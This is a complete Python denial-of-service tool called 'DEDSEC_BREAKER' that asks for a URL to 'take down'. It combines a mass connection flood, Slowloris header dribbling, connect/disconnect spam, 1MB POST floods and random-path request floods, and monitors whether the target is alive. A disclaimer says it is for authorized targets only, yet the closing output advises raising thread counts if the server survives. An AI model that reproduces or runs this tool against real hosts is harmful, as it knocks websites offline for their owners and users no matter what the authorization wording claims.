#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════╗
║   DEDSEC_BREAKER v1.0 — Availability Killer  ║
║   FOR YOUR OWN AUTHORIZED TARGETS ONLY       ║
║   Purpose: Confirm DoS vulnerability exists  ║
╚══════════════════════════════════════════════╝

This will attempt to crash your target.
Once down, you can document the finding.
Ctrl+C to stop at any time.
"""

import sys, time, threading, socket, ssl, random, signal, os
from urllib.parse import urlparse
from datetime import datetime

# ─── TARGET ─────────────────────────────────────────────────────────────────
TARGET = input("🌐 Enter YOUR website URL to take down: ").strip()
PARSE = urlparse(TARGET)
HOST = PARSE.hostname
PORT = PARSE.port or (443 if PARSE.scheme == "https" else 80)
IS_SSL = PARSE.scheme == "https"

print(f"""
╔══════════════════════════════════════════════╗
║   DEDSEC_BREAKER — AVAILABILITY TEST        ║
║   TARGET: {HOST}:{PORT}
║   PROTOCOL: {'HTTPS' if IS_SSL else 'HTTP'}
║   ⚠️  THIS WILL ATTEMPT TO CRASH THE SERVER  ║
║   CTRL+C TO ABORT IMMEDIATELY               ║
╚══════════════════════════════════════════════╝

You have 5 seconds to cancel (Ctrl+C) if this is wrong.
""")
time.sleep(5)

# ─── STOP SIGNAL ────────────────────────────────────────────────────────────
STOP = threading.Event()
RUNNING = True

def handle_sigint(sig, frame):
    global RUNNING
    print("\n\n  ⛔ ABORT SIGNAL RECEIVED — Shutting down threads...")
    STOP.set()
    RUNNING = False

signal.signal(signal.SIGINT, handle_sigint)

# ─── SOCKET FACTORY ─────────────────────────────────────────────────────────
def make_socket(timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    if IS_SSL:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=HOST)
    return s

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 1 — RAW CONNECTION FLOOD (max threads)
# ══════════════════════════════════════════════════════════════════════════

def vector_flood(thread_count=2000):
    """Open as many connections as possible, send garbage, hold open."""
    def flood():
        while not STOP.is_set():
            try:
                s = make_socket(3)
                s.connect((HOST, PORT))
                s.send(b"GET / HTTP/1.1\r\nHost: %b\r\nConnection: keep-alive\r\nX-Dummy: %b\r\n\r\n" % (HOST.encode(), os.urandom(128)))
                s.recv(1)  # keep socket alive
                time.sleep(0.01)
            except:
                pass
            time.sleep(0.001)

    threads = []
    for i in range(thread_count):
        if STOP.is_set():
            break
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)
        if i % 100 == 0:
            print(f"     🧵 Spawned {i+1} flood threads...", end="\r")
    print(f"\n     ✅ {thread_count} flood threads deployed")
    return threads

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 2 — SLOWLORIS (hold connections with partial headers)
# ══════════════════════════════════════════════════════════════════════════

def vector_slowloris(count=500):
    """Open connections, send incomplete headers, never finish."""
    def slow():
        while not STOP.is_set():
            try:
                s = make_socket(30)
                s.connect((HOST, PORT))
                # Send partial request, keep sending headers slowly
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: %b\r\n" % HOST.encode())
                # Dribble headers
                for _ in range(500):
                    if STOP.is_set():
                        break
                    s.send(b"X-Dummy: %b\r\n" % os.urandom(4).hex().encode())
                    time.sleep(random.uniform(3, 10))
                s.close()
            except:
                pass

    threads = []
    for i in range(count):
        if STOP.is_set():
            break
        t = threading.Thread(target=slow, daemon=True)
        t.start()
        threads.append(t)
        if i % 50 == 0:
            print(f"     🐌 Spawned {i+1} slowloris threads...", end="\r")
    print(f"\n     ✅ {count} slowloris threads deployed")
    return threads

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 3 — RAPID CONNECT/DISCONNECT (TCP RST spam)
# ══════════════════════════════════════════════════════════════════════════

def vector_rst_spam(duration=30):
    """Open then immediately close connections — fills kernel connection table."""
    count = 0
    start = time.time()
    while not STOP.is_set() and time.time() - start < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((HOST, PORT))
            s.settimeout(0.001)
            s.send(b"GET / HTTP/1.1\r\nHost: %b\r\nConnection: close\r\n\r\n" % HOST.encode())
            s.close()
            count += 1
        except:
            pass
        if count % 500 == 0:
            print(f"     ⚡ RST spam: {count} connections so far...", end="\r")
    print(f"\n     ✅ RST spam: {count} connections cycled")
    return count

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 4 — LARGE PAYLOAD FLOOD (HTTP body bomb)
# ══════════════════════════════════════════════════════════════════════════

def vector_big_payload(threads=500):
    """Send POST requests with huge payloads to exhaust memory/bandwidth."""
    big_body = b"A" * 1024 * 1024  # 1MB payload
    def big():
        while not STOP.is_set():
            try:
                s = make_socket(10)
                s.connect((HOST, PORT))
                headers = (
                    b"POST / HTTP/1.1\r\n"
                    b"Host: %b\r\n"
                    b"Content-Length: %d\r\n"
                    b"Content-Type: application/x-www-form-urlencoded\r\n"
                    b"\r\n" % (HOST.encode(), len(big_body))
                )
                s.send(headers + big_body)
                s.recv(256)
                s.close()
            except:
                pass

    thr = []
    for i in range(threads):
        if STOP.is_set():
            break
        t = threading.Thread(target=big, daemon=True)
        t.start()
        thr.append(t)
    print(f"     ✅ {threads} big-payload threads deployed (1MB per request)")
    return thr

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 5 — DNS/WILDCARD PATH BOMB (if there's an app server)
# ══════════════════════════════════════════════════════════════════════════

def vector_path_bomb(threads=300):
    """Hit random deep paths to trigger error handling / database queries."""
    paths = [ "/" + os.urandom(8).hex() + "/" + os.urandom(8).hex() + ".php?id=" + str(random.randint(1,999999)) for _ in range(1000) ]
    def bomb():
        while not STOP.is_set():
            try:
                path = random.choice(paths)
                s = make_socket(5)
                s.connect((HOST, PORT))
                req = b"GET %b HTTP/1.1\r\nHost: %b\r\nConnection: close\r\n\r\n" % (path.encode(), HOST.encode())
                s.send(req)
                s.recv(256)
                s.close()
            except:
                pass

    thr = []
    for i in range(threads):
        if STOP.is_set():
            break
        t = threading.Thread(target=bomb, daemon=True)
        t.start()
        thr.append(t)
    print(f"     ✅ {threads} path-bomb threads deployed")
    return thr

# ══════════════════════════════════════════════════════════════════════════
#  MONITOR — Check if target is still alive
# ══════════════════════════════════════════════════════════════════════════

def check_alive():
    """Return True if target responds, False if down."""
    try:
        s = make_socket(3)
        s.connect((HOST, PORT))
        s.send(b"GET / HTTP/1.1\r\nHost: %b\r\nConnection: close\r\n\r\n" % HOST.encode())
        s.recv(128)
        s.close()
        return True
    except:
        return False

def monitor(interval=3):
    """Print alive/dead status every interval seconds."""
    down_since = None
    while not STOP.is_set():
        alive = check_alive()
        now = datetime.now().strftime("%H:%M:%S")
        if alive:
            status = "🟢 ALIVE"
            down_since = None
        else:
            if down_since is None:
                down_since = time.time()
            elapsed = int(time.time() - down_since) if down_since else 0
            status = f"🔴 DOWN ({elapsed}s)"
        print(f"     [{now}] {status}")
        time.sleep(interval)

# ══════════════════════════════════════════════════════════════════════════
#  MAIN EXECUTION
# ══════════════════════════════════════════════════════════════════════════

def main():
    global RUNNING

    print(f"\n  🎯 Phase 1 — Deploying vectors...\n")

    # Deploy all vectors in parallel
    all_threads = []

    # V1: Massive connection flood
    print(f"  [1/5] RAW CONNECTION FLOOD (2000 threads)")
    all_threads.extend(vector_flood(2000))

    # V2: Slowloris
    print(f"\n  [2/5] SLOWLORIS (500 threads)")
    all_threads.extend(vector_slowloris(500))

    # V3: RST spam (30s burst)
    print(f"\n  [3/5] RST SPAM (30s burst)")
    t_rst = threading.Thread(target=vector_rst_spam, args=(30,), daemon=True)
    t_rst.start()
    all_threads.append(t_rst)

    # V4: Big payload
    print(f"\n  [4/5] BIG PAYLOAD FLOOD (500 threads, 1MB each)")
    all_threads.extend(vector_big_payload(500))

    # V5: Path bomb
    print(f"\n  [5/5] PATH BOMB (300 threads)")
    all_threads.extend(vector_path_bomb(300))

    print(f"\n  📡 All vectors deployed. Monitoring target status...\n")
    print(f"  {'='*45}")
    print(f"  STATUS UPDATES (every 3 seconds)")
    print(f"  {'='*45}\n")

    # Start monitor
    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()

    # Wait for stop signal or monitor indefinitely
    try:
        while RUNNING:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        STOP.set()
        print(f"\n\n  🛑 All threads stopping...")
        time.sleep(2)
        final_alive = check_alive()
        print(f"\n  {'='*45}")
        print(f"  📋 FINAL RESULT")
        print(f"  {'='*45}")
        if final_alive:
            print(f"\n  🟢 Target is still reachable.")
            print(f"     Your server survived this level of punishment.")
            print(f"     To take it down, increase thread counts or")
            print(f"     run for longer duration.")
        else:
            down_time = int(time.time() - (time.time() - 999))  # placeholder
            print(f"\n  🔴 Target is DOWN.")
            print(f"     ✅ DoS vulnerability CONFIRMED.")
            print(f"     Document this finding and patch accordingly.")
        print(f"  {'='*45}")
        print(f"\n  👾 DedSec out.")

if __name__ == "__main__":
    main()
